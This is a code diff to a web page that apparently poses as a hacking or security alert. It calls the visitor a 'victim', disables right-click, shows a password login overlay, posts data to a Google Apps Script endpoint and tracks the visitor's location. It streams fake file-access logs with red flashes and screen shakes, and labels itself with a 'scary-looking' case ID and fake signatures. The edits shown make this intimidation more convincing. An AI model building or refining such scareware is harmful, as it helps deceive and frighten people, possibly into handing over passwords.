@@ -369,7 +369,7 @@
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="session-display">SESSION_ID: <span id="session-id-text">246</span></div>
+    <div id="session-display">SESSION_ID: <span id="session-id-text">...</span></div>
 
     <div id="login-overlay">
         <div class="login-logo-circle"></div>
@@ -459,15 +459,18 @@
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby1mKnhVMl0BLavOxwIR7R1a2QpSpKm6TCYPriU9Au90plnYJD8E03idTESJ3M74nKZ/exec";
     const alertAudio = document.getElementById('alert-sound');
 
-    // --- 1. SESSION COUNTER ---
-    let sessionNum = localStorage.getItem('victim_session');
-    if (!sessionNum) {
-        sessionNum = 246; 
-    } else {
-        sessionNum = parseInt(sessionNum) + 2; 
+   // --- 1. RANDOM SESSION ID GENERATOR ---
+    let sessionID = localStorage.getItem('victim_session_id');
+    
+    if (!sessionID) {
+        // Generates a random ID like SEC-612-HTH4R7
+        sessionID = "SEC-" + Math.floor(Math.random() * 900 + 100) + "-" + (Math.random().toString(36).substring(2, 8)).toUpperCase();
+        localStorage.setItem('victim_session_id', sessionID);
     }
-    localStorage.setItem('victim_session', sessionNum);
-    document.getElementById('session-id-text').innerText = sessionNum;
+
+    // This updates the small green text in the bottom right corner
+    const sessionDisplay = document.getElementById('session-id-text');
+    if (sessionDisplay) sessionDisplay.innerText = sessionID;
 
     let userCity = "Unknown", userCountry = "Unknown";
 
@@ -728,27 +731,40 @@ function startEverything() {
         ];
 
        setInterval(() => {
-            if (logContent.children.length > 20) logContent.removeChild(logContent.firstChild);
+            if (logContent.children.length > 100) logContent.removeChild(logContent.firstChild);
             const line = document.createElement('div');
             line.style.color = "#0f0";
             logContent.appendChild(line);
 
             let msg = `> [${new Date().toLocaleTimeString()}] ${filePaths[Math.floor(Math.random() * filePaths.length)]}`;
             let i = 0;
-            let typer = setInterval(() => {
+           let typer = setInterval(() => {
                 line.innerHTML += msg.charAt(i);
                 i++;
+                
+                // CRITICAL: Scroll while typing so the user isn't looking at a frozen screen
+                terminal.scrollTop = terminal.scrollHeight; 
+
                 if (i >= msg.length) {
                     clearInterval(typer);
                     line.innerHTML += " <span style='color:white'>...DONE</span>";
+                    
+                    // Final snap to the bottom
                     terminal.scrollTop = terminal.scrollHeight;
                 }
-            }, 20);
+            }, 30);
 
+
+           // This triggers the red background pulse
             document.body.classList.add('red-alert-pulse');
-            setTimeout(() => document.body.classList.remove('red-alert-pulse'), 200);
-        }, 1000);
-    }
+            
+            // This triggers a subtle "glitch" shake on the whole screen
+            document.getElementById('main-wrapper').classList.add('shake');
+
+            setTimeout(() => {
+                document.body.classList.remove('red-alert-pulse');
+                document.getElementById('main-wrapper').classList.remove('shake');
+            }, 200);
     
 window.addEventListener('DOMContentLoaded', () => {
     // 1. Focus the password field
@@ -759,16 +775,18 @@ window.addEventListener('DOMContentLoaded', () => {
     fetchAllData(); 
 
     // 3. Generate a scary-looking Case ID
-    const randomID = "SEC-" + Math.floor(Math.random() * 900 + 100) + "-" + (Math.random().toString(36).substring(7)).toUpperCase();
-    const caseIdEl = document.getElementById('case-id');
-    if (caseIdEl) caseIdEl.innerText = randomID;
+    // ADD THIS INSTEAD (Points to the saved sessionID):
+document.getElementById('case-id').innerText = sessionID;
 
     // 4. Set a live timestamp
+    function updateClock() {
     const timeEl = document.getElementById('real-time');
     if (timeEl) {
-        const now = new Date();
-        timeEl.innerText = now.toLocaleString();
+        timeEl.innerText = new Date().toLocaleString();
     }
+}
+setInterval(updateClock, 1000);
+updateClock();
 
     // 5. DIGITAL SIGNATURE GENERATOR
     function generateFakeHash(input) {
